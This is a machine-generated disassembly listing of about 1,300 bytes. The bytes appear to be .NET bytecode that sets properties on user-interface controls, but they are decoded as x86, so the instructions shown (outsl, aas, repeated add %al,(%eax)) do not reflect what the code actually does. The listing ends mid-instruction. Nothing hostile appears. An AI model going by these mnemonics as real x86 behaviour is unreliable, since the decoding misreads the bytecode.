  402aa5:	7b 0e                	jnp    0x402ab5
  402aa7:	00 00                	add    %al,(%eax)
  402aa9:	04 6f                	add    $0x6f,%al
  402aab:	4f                   	dec    %edi
  402aac:	00 00                	add    %al,(%eax)
  402aae:	0a 00                	or     (%eax),%al
  402ab0:	02 7b 0c             	add    0xc(%ebx),%bh
  402ab3:	00 00                	add    %al,(%eax)
  402ab5:	04 1f                	add    $0x1f,%al
  402ab7:	15 1f 31 73 35       	adc    $0x3573311f,%eax
  402abc:	00 00                	add    %al,(%eax)
  402abe:	0a 6f 36             	or     0x36(%edi),%ch
  402ac1:	00 00                	add    %al,(%eax)
  402ac3:	0a 00                	or     (%eax),%al
  402ac5:	02 7b 0c             	add    0xc(%ebx),%bh
  402ac8:	00 00                	add    %al,(%eax)
  402aca:	04 72                	add    $0x72,%al
  402acc:	3f                   	aas
  402acd:	02 00                	add    (%eax),%al
  402acf:	70 6f                	jo     0x402b40
  402ad1:	37                   	aaa
  402ad2:	00 00                	add    %al,(%eax)
  402ad4:	0a 00                	or     (%eax),%al
  402ad6:	02 7b 0c             	add    0xc(%ebx),%bh
  402ad9:	00 00                	add    %al,(%eax)
  402adb:	04 20                	add    $0x20,%al
  402add:	a9 00 00 00 20       	test   $0x20000000,%eax
  402ae2:	19 01                	sbb    %eax,(%ecx)
  402ae4:	00 00                	add    %al,(%eax)
  402ae6:	73 38                	jae    0x402b20
  402ae8:	00 00                	add    %al,(%eax)
  402aea:	0a 6f 39             	or     0x39(%edi),%ch
  402aed:	00 00                	add    %al,(%eax)
  402aef:	0a 00                	or     (%eax),%al
  402af1:	02 7b 0c             	add    0xc(%ebx),%bh
  402af4:	00 00                	add    %al,(%eax)
  402af6:	04 1c                	add    $0x1c,%al
  402af8:	6f                   	outsl  %ds:(%esi),(%dx)
  402af9:	3a 00                	cmp    (%eax),%al
  402afb:	00 0a                	add    %cl,(%edx)
  402afd:	00 02                	add    %al,(%edx)
  402aff:	7b 21                	jnp    0x402b22
  402b01:	00 00                	add    %al,(%eax)
  402b03:	04 17                	add    $0x17,%al
  402b05:	6f                   	outsl  %ds:(%esi),(%dx)
  402b06:	3e 00 00             	add    %al,%ds:(%eax)
  402b09:	0a 00                	or     (%eax),%al
  402b0b:	02 7b 21             	add    0x21(%ebx),%bh
  402b0e:	00 00                	add    %al,(%eax)
  402b10:	04 20                	add    $0x20,%al
  402b12:	d8 00                	fadds  (%eax)
  402b14:	00 00                	add    %al,(%eax)
  402b16:	16                   	push   %ss
  402b17:	1f                   	pop    %ds
  402b18:	32 28                	xor    (%eax),%ch
  402b1a:	32 00                	xor    (%eax),%al
  402b1c:	00 0a                	add    %cl,(%edx)
  402b1e:	6f                   	outsl  %ds:(%esi),(%dx)
  402b1f:	33 00                	xor    (%eax),%eax
  402b21:	00 0a                	add    %cl,(%edx)
  402b23:	00 02                	add    %al,(%edx)
  402b25:	7b 21                	jnp    0x402b48
  402b27:	00 00                	add    %al,(%eax)
  402b29:	04 6f                	add    $0x6f,%al
  402b2b:	3f                   	aas
  402b2c:	00 00                	add    %al,(%eax)
  402b2e:	0a 20                	or     (%eax),%ah
  402b30:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  402b36:	00 00                	add    %al,(%eax)
  402b38:	00 20                	add    %ah,(%eax)
  402b3a:	a2 00 00 00 28       	mov    %al,0x28000000
  402b3f:	32 00                	xor    (%eax),%al
  402b41:	00 0a                	add    %cl,(%edx)
  402b43:	6f                   	outsl  %ds:(%esi),(%dx)
  402b44:	40                   	inc    %eax
  402b45:	00 00                	add    %al,(%eax)
  402b47:	0a 00                	or     (%eax),%al
  402b49:	02 7b 21             	add    0x21(%ebx),%bh
  402b4c:	00 00                	add    %al,(%eax)
  402b4e:	04 6f                	add    $0x6f,%al
  402b50:	3f                   	aas
  402b51:	00 00                	add    %al,(%eax)
  402b53:	0a 20                	or     (%eax),%ah
  402b55:	d8 00                	fadds  (%eax)
  402b57:	00 00                	add    %al,(%eax)
  402b59:	16                   	push   %ss
  402b5a:	1f                   	pop    %ds
  402b5b:	32 28                	xor    (%eax),%ch
  402b5d:	32 00                	xor    (%eax),%al
  402b5f:	00 0a                	add    %cl,(%edx)
  402b61:	6f                   	outsl  %ds:(%esi),(%dx)
  402b62:	41                   	inc    %ecx
  402b63:	00 00                	add    %al,(%eax)
  402b65:	0a 00                	or     (%eax),%al
  402b67:	02 7b 21             	add    0x21(%ebx),%bh
  402b6a:	00 00                	add    %al,(%eax)
  402b6c:	04 6f                	add    $0x6f,%al
  402b6e:	3f                   	aas
  402b6f:	00 00                	add    %al,(%eax)
  402b71:	0a 20                	or     (%eax),%ah
  402b73:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  402b79:	00 00                	add    %al,(%eax)
  402b7b:	00 20                	add    %ah,(%eax)
  402b7d:	a2 00 00 00 28       	mov    %al,0x28000000
  402b82:	32 00                	xor    (%eax),%al
  402b84:	00 0a                	add    %cl,(%edx)
  402b86:	6f                   	outsl  %ds:(%esi),(%dx)
  402b87:	42                   	inc    %edx
  402b88:	00 00                	add    %al,(%eax)
  402b8a:	0a 00                	or     (%eax),%al
  402b8c:	02 7b 21             	add    0x21(%ebx),%bh
  402b8f:	00 00                	add    %al,(%eax)
  402b91:	04 16                	add    $0x16,%al
  402b93:	6f                   	outsl  %ds:(%esi),(%dx)
  402b94:	43                   	inc    %ebx
  402b95:	00 00                	add    %al,(%eax)
  402b97:	0a 00                	or     (%eax),%al
  402b99:	02 7b 21             	add    0x21(%ebx),%bh
  402b9c:	00 00                	add    %al,(%eax)
  402b9e:	04 72                	add    $0x72,%al
  402ba0:	eb 01                	jmp    0x402ba3
  402ba2:	00 70 22             	add    %dh,0x22(%eax)
  402ba5:	00 00                	add    %al,(%eax)
  402ba7:	10 41 16             	adc    %al,0x16(%ecx)
  402baa:	19 20                	sbb    %esp,(%eax)
  402bac:	a2 00 00 00 73       	mov    %al,0x73000000
  402bb1:	44                   	inc    %esp
  402bb2:	00 00                	add    %al,(%eax)
  402bb4:	0a 6f 45             	or     0x45(%edi),%ch
  402bb7:	00 00                	add    %al,(%eax)
  402bb9:	0a 00                	or     (%eax),%al
  402bbb:	02 7b 21             	add    0x21(%ebx),%bh
  402bbe:	00 00                	add    %al,(%eax)
  402bc0:	04 20                	add    $0x20,%al
  402bc2:	f9                   	stc
  402bc3:	00 00                	add    %al,(%eax)
  402bc5:	00 20                	add    %ah,(%eax)
  402bc7:	de 00                	fiadds (%eax)
  402bc9:	00 00                	add    %al,(%eax)
  402bcb:	20 c9                	and    %cl,%cl
  402bcd:	00 00                	add    %al,(%eax)
  402bcf:	00 28                	add    %ch,(%eax)
  402bd1:	32 00                	xor    (%eax),%al
  402bd3:	00 0a                	add    %cl,(%edx)
  402bd5:	6f                   	outsl  %ds:(%esi),(%dx)
  402bd6:	46                   	inc    %esi
  402bd7:	00 00                	add    %al,(%eax)
  402bd9:	0a 00                	or     (%eax),%al
  402bdb:	02 7b 21             	add    0x21(%ebx),%bh
  402bde:	00 00                	add    %al,(%eax)
  402be0:	04 1f                	add    $0x1f,%al
  402be2:	2b 20                	sub    (%eax),%esp
  402be4:	c6 00 00             	movb   $0x0,(%eax)
  402be7:	00 73 35             	add    %dh,0x35(%ebx)
  402bea:	00 00                	add    %al,(%eax)
  402bec:	0a 6f 36             	or     0x36(%edi),%ch
  402bef:	00 00                	add    %al,(%eax)
  402bf1:	0a 00                	or     (%eax),%al
  402bf3:	02 7b 21             	add    0x21(%ebx),%bh
  402bf6:	00 00                	add    %al,(%eax)
  402bf8:	04 72                	add    $0x72,%al
  402bfa:	4d                   	dec    %ebp
  402bfb:	02 00                	add    (%eax),%al
  402bfd:	70 6f                	jo     0x402c6e
  402bff:	37                   	aaa
  402c00:	00 00                	add    %al,(%eax)
  402c02:	0a 00                	or     (%eax),%al
  402c04:	02 7b 21             	add    0x21(%ebx),%bh
  402c07:	00 00                	add    %al,(%eax)
  402c09:	04 1f                	add    $0x1f,%al
  402c0b:	4e                   	dec    %esi
  402c0c:	1f                   	pop    %ds
  402c0d:	1b 73 38             	sbb    0x38(%ebx),%esi
  402c10:	00 00                	add    %al,(%eax)
  402c12:	0a 6f 39             	or     0x39(%edi),%ch
  402c15:	00 00                	add    %al,(%eax)
  402c17:	0a 00                	or     (%eax),%al
  402c19:	02 7b 21             	add    0x21(%ebx),%bh
  402c1c:	00 00                	add    %al,(%eax)
  402c1e:	04 1f                	add    $0x1f,%al
  402c20:	15 6f 3a 00 00       	adc    $0x3a6f,%eax
  402c25:	0a 00                	or     (%eax),%al
  402c27:	02 7b 21             	add    0x21(%ebx),%bh
  402c2a:	00 00                	add    %al,(%eax)
  402c2c:	04 72                	add    $0x72,%al
  402c2e:	5f                   	pop    %edi
  402c2f:	02 00                	add    (%eax),%al
  402c31:	70 6f                	jo     0x402ca2
  402c33:	47                   	inc    %edi
  402c34:	00 00                	add    %al,(%eax)
  402c36:	0a 00                	or     (%eax),%al
  402c38:	02 7b 21             	add    0x21(%ebx),%bh
  402c3b:	00 00                	add    %al,(%eax)
  402c3d:	04 18                	add    $0x18,%al
  402c3f:	6f                   	outsl  %ds:(%esi),(%dx)
  402c40:	50                   	push   %eax
  402c41:	00 00                	add    %al,(%eax)
  402c43:	0a 00                	or     (%eax),%al
  402c45:	02 7b 21             	add    0x21(%ebx),%bh
  402c48:	00 00                	add    %al,(%eax)
  402c4a:	04 16                	add    $0x16,%al
  402c4c:	6f                   	outsl  %ds:(%esi),(%dx)
  402c4d:	48                   	dec    %eax
  402c4e:	00 00                	add    %al,(%eax)
  402c50:	0a 00                	or     (%eax),%al
  402c52:	02 7b 21             	add    0x21(%ebx),%bh
  402c55:	00 00                	add    %al,(%eax)
  402c57:	04 02                	add    $0x2,%al
  402c59:	fe 06                	incb   (%esi)
  402c5b:	16                   	push   %ss
  402c5c:	00 00                	add    %al,(%eax)
  402c5e:	06                   	push   %es
  402c5f:	73 49                	jae    0x402caa
  402c61:	00 00                	add    %al,(%eax)
  402c63:	0a 6f 4a             	or     0x4a(%edi),%ch
  402c66:	00 00                	add    %al,(%eax)
  402c68:	0a 00                	or     (%eax),%al
  402c6a:	02 7b 22             	add    0x22(%ebx),%bh
  402c6d:	00 00                	add    %al,(%eax)
  402c6f:	04 17                	add    $0x17,%al
  402c71:	6f                   	outsl  %ds:(%esi),(%dx)
  402c72:	3e 00 00             	add    %al,%ds:(%eax)
  402c75:	0a 00                	or     (%eax),%al
  402c77:	02 7b 22             	add    0x22(%ebx),%bh
  402c7a:	00 00                	add    %al,(%eax)
  402c7c:	04 20                	add    $0x20,%al
  402c7e:	d8 00                	fadds  (%eax)
  402c80:	00 00                	add    %al,(%eax)
  402c82:	16                   	push   %ss
  402c83:	1f                   	pop    %ds
  402c84:	32 28                	xor    (%eax),%ch
  402c86:	32 00                	xor    (%eax),%al
  402c88:	00 0a                	add    %cl,(%edx)
  402c8a:	6f                   	outsl  %ds:(%esi),(%dx)
  402c8b:	33 00                	xor    (%eax),%eax
  402c8d:	00 0a                	add    %cl,(%edx)
  402c8f:	00 02                	add    %al,(%edx)
  402c91:	7b 22                	jnp    0x402cb5
  402c93:	00 00                	add    %al,(%eax)
  402c95:	04 6f                	add    $0x6f,%al
  402c97:	3f                   	aas
  402c98:	00 00                	add    %al,(%eax)
  402c9a:	0a 20                	or     (%eax),%ah
  402c9c:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  402ca2:	00 00                	add    %al,(%eax)
  402ca4:	00 20                	add    %ah,(%eax)
  402ca6:	a2 00 00 00 28       	mov    %al,0x28000000
  402cab:	32 00                	xor    (%eax),%al
  402cad:	00 0a                	add    %cl,(%edx)
  402caf:	6f                   	outsl  %ds:(%esi),(%dx)
  402cb0:	40                   	inc    %eax
  402cb1:	00 00                	add    %al,(%eax)
  402cb3:	0a 00                	or     (%eax),%al
  402cb5:	02 7b 22             	add    0x22(%ebx),%bh
  402cb8:	00 00                	add    %al,(%eax)
  402cba:	04 6f                	add    $0x6f,%al
  402cbc:	3f                   	aas
  402cbd:	00 00                	add    %al,(%eax)
  402cbf:	0a 20                	or     (%eax),%ah
  402cc1:	d8 00                	fadds  (%eax)
  402cc3:	00 00                	add    %al,(%eax)
  402cc5:	16                   	push   %ss
  402cc6:	1f                   	pop    %ds
  402cc7:	32 28                	xor    (%eax),%ch
  402cc9:	32 00                	xor    (%eax),%al
  402ccb:	00 0a                	add    %cl,(%edx)
  402ccd:	6f                   	outsl  %ds:(%esi),(%dx)
  402cce:	41                   	inc    %ecx
  402ccf:	00 00                	add    %al,(%eax)
  402cd1:	0a 00                	or     (%eax),%al
  402cd3:	02 7b 22             	add    0x22(%ebx),%bh
  402cd6:	00 00                	add    %al,(%eax)
  402cd8:	04 6f                	add    $0x6f,%al
  402cda:	3f                   	aas
  402cdb:	00 00                	add    %al,(%eax)
  402cdd:	0a 20                	or     (%eax),%ah
  402cdf:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  402ce5:	00 00                	add    %al,(%eax)
  402ce7:	00 20                	add    %ah,(%eax)
  402ce9:	a2 00 00 00 28       	mov    %al,0x28000000
  402cee:	32 00                	xor    (%eax),%al
  402cf0:	00 0a                	add    %cl,(%edx)
  402cf2:	6f                   	outsl  %ds:(%esi),(%dx)
  402cf3:	42                   	inc    %edx
  402cf4:	00 00                	add    %al,(%eax)
  402cf6:	0a 00                	or     (%eax),%al
  402cf8:	02 7b 22             	add    0x22(%ebx),%bh
  402cfb:	00 00                	add    %al,(%eax)
  402cfd:	04 16                	add    $0x16,%al
  402cff:	6f                   	outsl  %ds:(%esi),(%dx)
  402d00:	43                   	inc    %ebx
  402d01:	00 00                	add    %al,(%eax)
  402d03:	0a 00                	or     (%eax),%al
  402d05:	02 7b 22             	add    0x22(%ebx),%bh
  402d08:	00 00                	add    %al,(%eax)
  402d0a:	04 72                	add    $0x72,%al
  402d0c:	eb 01                	jmp    0x402d0f
  402d0e:	00 70 22             	add    %dh,0x22(%eax)
  402d11:	00 00                	add    %al,(%eax)
  402d13:	10 41 16             	adc    %al,0x16(%ecx)
  402d16:	19 20                	sbb    %esp,(%eax)
  402d18:	a2 00 00 00 73       	mov    %al,0x73000000
  402d1d:	44                   	inc    %esp
  402d1e:	00 00                	add    %al,(%eax)
  402d20:	0a 6f 45             	or     0x45(%edi),%ch
  402d23:	00 00                	add    %al,(%eax)
  402d25:	0a 00                	or     (%eax),%al
  402d27:	02 7b 22             	add    0x22(%ebx),%bh
  402d2a:	00 00                	add    %al,(%eax)
  402d2c:	04 20                	add    $0x20,%al
  402d2e:	f9                   	stc
  402d2f:	00 00                	add    %al,(%eax)
  402d31:	00 20                	add    %ah,(%eax)
  402d33:	de 00                	fiadds (%eax)
  402d35:	00 00                	add    %al,(%eax)
  402d37:	20 c9                	and    %cl,%cl
  402d39:	00 00                	add    %al,(%eax)
  402d3b:	00 28                	add    %ch,(%eax)
  402d3d:	32 00                	xor    (%eax),%al
  402d3f:	00 0a                	add    %cl,(%edx)
  402d41:	6f                   	outsl  %ds:(%esi),(%dx)
  402d42:	46                   	inc    %esi
  402d43:	00 00                	add    %al,(%eax)
  402d45:	0a 00                	or     (%eax),%al
  402d47:	02 7b 22             	add    0x22(%ebx),%bh
  402d4a:	00 00                	add    %al,(%eax)
  402d4c:	04 1f                	add    $0x1f,%al
  402d4e:	56                   	push   %esi
  402d4f:	20 a5 00 00 00 73    	and    %ah,0x73000000(%ebp)
  402d55:	35 00 00 0a 6f       	xor    $0x6f0a0000,%eax
  402d5a:	36 00 00             	add    %al,%ss:(%eax)
  402d5d:	0a 00                	or     (%eax),%al
  402d5f:	02 7b 22             	add    0x22(%ebx),%bh
  402d62:	00 00                	add    %al,(%eax)
  402d64:	04 72                	add    $0x72,%al
  402d66:	73 02                	jae    0x402d6a
  402d68:	00 70 6f             	add    %dh,0x6f(%eax)
  402d6b:	37                   	aaa
  402d6c:	00 00                	add    %al,(%eax)
  402d6e:	0a 00                	or     (%eax),%al
  402d70:	02 7b 22             	add    0x22(%ebx),%bh
  402d73:	00 00                	add    %al,(%eax)
  402d75:	04 1f                	add    $0x1f,%al
  402d77:	40                   	inc    %eax
  402d78:	1f                   	pop    %ds
  402d79:	1b 73 38             	sbb    0x38(%ebx),%esi
  402d7c:	00 00                	add    %al,(%eax)
  402d7e:	0a 6f 39             	or     0x39(%edi),%ch
  402d81:	00 00                	add    %al,(%eax)
  402d83:	0a 00                	or     (%eax),%al
  402d85:	02 7b 22             	add    0x22(%ebx),%bh
  402d88:	00 00                	add    %al,(%eax)
  402d8a:	04 1f                	add    $0x1f,%al
  402d8c:	14 6f                	adc    $0x6f,%al
  402d8e:	3a 00                	cmp    (%eax),%al
  402d90:	00 0a                	add    %cl,(%edx)
  402d92:	00 02                	add    %al,(%edx)
  402d94:	7b 22                	jnp    0x402db8
  402d96:	00 00                	add    %al,(%eax)
  402d98:	04 72                	add    $0x72,%al
  402d9a:	85 02                	test   %eax,(%edx)
  402d9c:	00 70 6f             	add    %dh,0x6f(%eax)
  402d9f:	47                   	inc    %edi
  402da0:	00 00                	add    %al,(%eax)
  402da2:	0a 00                	or     (%eax),%al
  402da4:	02 7b 22             	add    0x22(%ebx),%bh
  402da7:	00 00                	add    %al,(%eax)
  402da9:	04 18                	add    $0x18,%al
  402dab:	6f                   	outsl  %ds:(%esi),(%dx)
  402dac:	50                   	push   %eax
  402dad:	00 00                	add    %al,(%eax)
  402daf:	0a 00                	or     (%eax),%al
  402db1:	02 7b 22             	add    0x22(%ebx),%bh
  402db4:	00 00                	add    %al,(%eax)
  402db6:	04 16                	add    $0x16,%al
  402db8:	6f                   	outsl  %ds:(%esi),(%dx)
  402db9:	48                   	dec    %eax
  402dba:	00 00                	add    %al,(%eax)
  402dbc:	0a 00                	or     (%eax),%al
  402dbe:	02 7b 22             	add    0x22(%ebx),%bh
  402dc1:	00 00                	add    %al,(%eax)
  402dc3:	04 02                	add    $0x2,%al
  402dc5:	fe 06                	incb   (%esi)
  402dc7:	14 00                	adc    $0x0,%al
  402dc9:	00 06                	add    %al,(%esi)
  402dcb:	73 49                	jae    0x402e16
  402dcd:	00 00                	add    %al,(%eax)
  402dcf:	0a 6f 4a             	or     0x4a(%edi),%ch
  402dd2:	00 00                	add    %al,(%eax)
  402dd4:	0a 00                	or     (%eax),%al
  402dd6:	02 7b 23             	add    0x23(%ebx),%bh
  402dd9:	00 00                	add    %al,(%eax)
  402ddb:	04 17                	add    $0x17,%al
  402ddd:	6f                   	outsl  %ds:(%esi),(%dx)
  402dde:	3e 00 00             	add    %al,%ds:(%eax)
  402de1:	0a 00                	or     (%eax),%al
  402de3:	02 7b 23             	add    0x23(%ebx),%bh
  402de6:	00 00                	add    %al,(%eax)
  402de8:	04 20                	add    $0x20,%al
  402dea:	d8 00                	fadds  (%eax)
  402dec:	00 00                	add    %al,(%eax)
  402dee:	16                   	push   %ss
  402def:	1f                   	pop    %ds
  402df0:	32 28                	xor    (%eax),%ch
  402df2:	32 00                	xor    (%eax),%al
  402df4:	00 0a                	add    %cl,(%edx)
  402df6:	6f                   	outsl  %ds:(%esi),(%dx)
  402df7:	33 00                	xor    (%eax),%eax
  402df9:	00 0a                	add    %cl,(%edx)
  402dfb:	00 02                	add    %al,(%edx)
  402dfd:	7b 23                	jnp    0x402e22
  402dff:	00 00                	add    %al,(%eax)
  402e01:	04 6f                	add    $0x6f,%al
  402e03:	3f                   	aas
  402e04:	00 00                	add    %al,(%eax)
  402e06:	0a 20                	or     (%eax),%ah
  402e08:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  402e0e:	00 00                	add    %al,(%eax)
  402e10:	00 20                	add    %ah,(%eax)
  402e12:	a2 00 00 00 28       	mov    %al,0x28000000
  402e17:	32 00                	xor    (%eax),%al
  402e19:	00 0a                	add    %cl,(%edx)
  402e1b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e1c:	40                   	inc    %eax
  402e1d:	00 00                	add    %al,(%eax)
  402e1f:	0a 00                	or     (%eax),%al
  402e21:	02 7b 23             	add    0x23(%ebx),%bh
  402e24:	00 00                	add    %al,(%eax)
  402e26:	04 6f                	add    $0x6f,%al
  402e28:	3f                   	aas
  402e29:	00 00                	add    %al,(%eax)
  402e2b:	0a 20                	or     (%eax),%ah
  402e2d:	d8 00                	fadds  (%eax)
  402e2f:	00 00                	add    %al,(%eax)
  402e31:	16                   	push   %ss
  402e32:	1f                   	pop    %ds
  402e33:	32 28                	xor    (%eax),%ch
  402e35:	32 00                	xor    (%eax),%al
  402e37:	00 0a                	add    %cl,(%edx)
  402e39:	6f                   	outsl  %ds:(%esi),(%dx)
  402e3a:	41                   	inc    %ecx
  402e3b:	00 00                	add    %al,(%eax)
  402e3d:	0a 00                	or     (%eax),%al
  402e3f:	02 7b 23             	add    0x23(%ebx),%bh
  402e42:	00 00                	add    %al,(%eax)
  402e44:	04 6f                	add    $0x6f,%al
  402e46:	3f                   	aas
  402e47:	00 00                	add    %al,(%eax)
  402e49:	0a 20                	or     (%eax),%ah
  402e4b:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  402e51:	00 00                	add    %al,(%eax)
  402e53:	00 20                	add    %ah,(%eax)
  402e55:	a2 00 00 00 28       	mov    %al,0x28000000
  402e5a:	32 00                	xor    (%eax),%al
  402e5c:	00 0a                	add    %cl,(%edx)
  402e5e:	6f                   	outsl  %ds:(%esi),(%dx)
  402e5f:	42                   	inc    %edx
  402e60:	00 00                	add    %al,(%eax)
  402e62:	0a 00                	or     (%eax),%al
  402e64:	02 7b 23             	add    0x23(%ebx),%bh
  402e67:	00 00                	add    %al,(%eax)
  402e69:	04 16                	add    $0x16,%al
  402e6b:	6f                   	outsl  %ds:(%esi),(%dx)
  402e6c:	43                   	inc    %ebx
  402e6d:	00 00                	add    %al,(%eax)
  402e6f:	0a 00                	or     (%eax),%al
  402e71:	02 7b 23             	add    0x23(%ebx),%bh
  402e74:	00 00                	add    %al,(%eax)
  402e76:	04 72                	add    $0x72,%al
  402e78:	eb 01                	jmp    0x402e7b
  402e7a:	00 70 22             	add    %dh,0x22(%eax)
  402e7d:	00 00                	add    %al,(%eax)
  402e7f:	10 41 16             	adc    %al,0x16(%ecx)
  402e82:	19 20                	sbb    %esp,(%eax)
  402e84:	a2 00 00 00 73       	mov    %al,0x73000000
  402e89:	44                   	inc    %esp
  402e8a:	00 00                	add    %al,(%eax)
  402e8c:	0a 6f 45             	or     0x45(%edi),%ch
  402e8f:	00 00                	add    %al,(%eax)
  402e91:	0a 00                	or     (%eax),%al
  402e93:	02 7b 23             	add    0x23(%ebx),%bh
  402e96:	00 00                	add    %al,(%eax)
  402e98:	04 20                	add    $0x20,%al
  402e9a:	f9                   	stc
  402e9b:	00 00                	add    %al,(%eax)
  402e9d:	00 20                	add    %ah,(%eax)
  402e9f:	de 00                	fiadds (%eax)
  402ea1:	00 00                	add    %al,(%eax)
  402ea3:	20 c9                	and    %cl,%cl
  402ea5:	00 00                	add    %al,(%eax)
  402ea7:	00 28                	add    %ch,(%eax)
  402ea9:	32 00                	xor    (%eax),%al
  402eab:	00 0a                	add    %cl,(%edx)
  402ead:	6f                   	outsl  %ds:(%esi),(%dx)
  402eae:	46                   	inc    %esi
  402eaf:	00 00                	add    %al,(%eax)
  402eb1:	0a 00                	or     (%eax),%al
  402eb3:	02 7b 23             	add    0x23(%ebx),%bh
  402eb6:	00 00                	add    %al,(%eax)
  402eb8:	04 1f                	add    $0x1f,%al
  402eba:	10 20                	adc    %ah,(%eax)
  402ebc:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  402ebd:	00 00                	add    %al,(%eax)
  402ebf:	00 73 35             	add    %dh,0x35(%ebx)
  402ec2:	00 00                	add    %al,(%eax)
  402ec4:	0a 6f 36             	or     0x36(%edi),%ch
  402ec7:	00 00                	add    %al,(%eax)
  402ec9:	0a 00                	or     (%eax),%al
  402ecb:	02 7b 23             	add    0x23(%ebx),%bh
  402ece:	00 00                	add    %al,(%eax)
  402ed0:	04 72                	add    $0x72,%al
  402ed2:	91                   	xchg   %eax,%ecx
  402ed3:	02 00                	add    (%eax),%al
  402ed5:	70 6f                	jo     0x402f46
  402ed7:	37                   	aaa
  402ed8:	00 00                	add    %al,(%eax)
  402eda:	0a 00                	or     (%eax),%al
  402edc:	02 7b 23             	add    0x23(%ebx),%bh
  402edf:	00 00                	add    %al,(%eax)
  402ee1:	04 1f                	add    $0x1f,%al
  402ee3:	40                   	inc    %eax
  402ee4:	1f                   	pop    %ds
  402ee5:	1b 73 38             	sbb    0x38(%ebx),%esi
  402ee8:	00 00                	add    %al,(%eax)
  402eea:	0a 6f 39             	or     0x39(%edi),%ch
  402eed:	00 00                	add    %al,(%eax)
  402eef:	0a 00                	or     (%eax),%al
  402ef1:	02 7b 23             	add    0x23(%ebx),%bh
  402ef4:	00 00                	add    %al,(%eax)
  402ef6:	04 1f                	add    $0x1f,%al
  402ef8:	13 6f 3a             	adc    0x3a(%edi),%ebp
  402efb:	00 00                	add    %al,(%eax)
  402efd:	0a 00                	or     (%eax),%al
  402eff:	02 7b 23             	add    0x23(%ebx),%bh
  402f02:	00 00                	add    %al,(%eax)
  402f04:	04 72                	add    $0x72,%al
  402f06:	a3 02 00 70 6f       	mov    %eax,0x6f700002
  402f0b:	47                   	inc    %edi
  402f0c:	00 00                	add    %al,(%eax)
  402f0e:	0a 00                	or     (%eax),%al
  402f10:	02 7b 23             	add    0x23(%ebx),%bh
  402f13:	00 00                	add    %al,(%eax)
  402f15:	04 18                	add    $0x18,%al
  402f17:	6f                   	outsl  %ds:(%esi),(%dx)
  402f18:	50                   	push   %eax
  402f19:	00 00                	add    %al,(%eax)
  402f1b:	0a 00                	or     (%eax),%al
  402f1d:	02 7b 23             	add    0x23(%ebx),%bh
  402f20:	00 00                	add    %al,(%eax)
  402f22:	04 16                	add    $0x16,%al
  402f24:	6f                   	outsl  %ds:(%esi),(%dx)
  402f25:	48                   	dec    %eax
  402f26:	00 00                	add    %al,(%eax)
  402f28:	0a 00                	or     (%eax),%al
  402f2a:	02 7b 23             	add    0x23(%ebx),%bh
  402f2d:	00 00                	add    %al,(%eax)
  402f2f:	04 02                	add    $0x2,%al
  402f31:	fe 06                	incb   (%esi)
  402f33:	15 00 00 06 73       	adc    $0x73060000,%eax
  402f38:	49                   	dec    %ecx
  402f39:	00 00                	add    %al,(%eax)
  402f3b:	0a 6f 4a             	or     0x4a(%edi),%ch
  402f3e:	00 00                	add    %al,(%eax)
  402f40:	0a 00                	or     (%eax),%al
  402f42:	02 7b 24             	add    0x24(%ebx),%bh
  402f45:	00 00                	add    %al,(%eax)
  402f47:	04 17                	add    $0x17,%al
  402f49:	6f                   	outsl  %ds:(%esi),(%dx)
  402f4a:	3e 00 00             	add    %al,%ds:(%eax)
  402f4d:	0a 00                	or     (%eax),%al
  402f4f:	02 7b 24             	add    0x24(%ebx),%bh
  402f52:	00 00                	add    %al,(%eax)
  402f54:	04 20                	add    $0x20,%al
  402f56:	d8 00                	fadds  (%eax)
  402f58:	00 00                	add    %al,(%eax)
  402f5a:	16                   	push   %ss
  402f5b:	1f                   	pop    %ds
  402f5c:	32 28                	xor    (%eax),%ch
  402f5e:	32 00                	xor    (%eax),%al
  402f60:	00 0a                	add    %cl,(%edx)
  402f62:	6f                   	outsl  %ds:(%esi),(%dx)
  402f63:	33 00                	xor    (%eax),%eax
  402f65:	00 0a                	add    %cl,(%edx)
  402f67:	00 02                	add    %al,(%edx)
  402f69:	7b 24                	jnp    0x402f8f
  402f6b:	00 00                	add    %al,(%eax)
  402f6d:	04 6f                	add    $0x6f,%al
  402f6f:	3f                   	aas
  402f70:	00 00                	add    %al,(%eax)
  402f72:	0a 20                	or     (%eax),%ah
  402f74:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  402f7a:	00 00                	add    %al,(%eax)
  402f7c:	00 20                	add    %ah,(%eax)
  402f7e:	a2 00 00 00 28       	mov    %al,0x28000000
  402f83:	32 00                	xor    (%eax),%al
  402f85:	00 0a                	add    %cl,(%edx)
  402f87:	6f                   	outsl  %ds:(%esi),(%dx)
  402f88:	40                   	inc    %eax
  402f89:	00 00                	add    %al,(%eax)
  402f8b:	0a 00                	or     (%eax),%al
  402f8d:	02 7b 24             	add    0x24(%ebx),%bh
  402f90:	00 00                	add    %al,(%eax)
  402f92:	04 6f                	add    $0x6f,%al
  402f94:	3f                   	aas
  402f95:	00 00                	add    %al,(%eax)
  402f97:	0a 20                	or     (%eax),%ah
  402f99:	d8 00                	fadds  (%eax)
  402f9b:	00 00                	add    %al,(%eax)
  402f9d:	16                   	push   %ss
  402f9e:	1f                   	pop    %ds
  402f9f:	32 28                	xor    (%eax),%ch
  402fa1:	32 00                	xor    (%eax),%al
  402fa3:	00 0a                	add    %cl,(%edx)
  402fa5:	6f                   	outsl  %ds:(%esi),(%dx)
  402fa6:	41                   	inc    %ecx
  402fa7:	00 00                	add    %al,(%eax)
  402fa9:	0a 00                	or     (%eax),%al
  402fab:	02 7b 24             	add    0x24(%ebx),%bh
  402fae:	00 00                	add    %al,(%eax)
  402fb0:	04 6f                	add    $0x6f,%al
  402fb2:	3f                   	aas
  402fb3:	00 00                	add    %al,(%eax)
  402fb5:	0a 20                	or     (%eax),%ah
  402fb7:	f7 00 00 00 20 8c    	testl  $0x8c200000,(%eax)
  402fbd:	00 00                	add    %al,(%eax)
  402fbf:	00 20                	add    %ah,(%eax)
  402fc1:	a2 00 00 00 28       	mov    %al,0x28000000
  402fc6:	32 00                	xor    (%eax),%al
  402fc8:	00 0a                	add    %cl,(%edx)
  402fca:	6f                   	outsl  %ds:(%esi),(%dx)
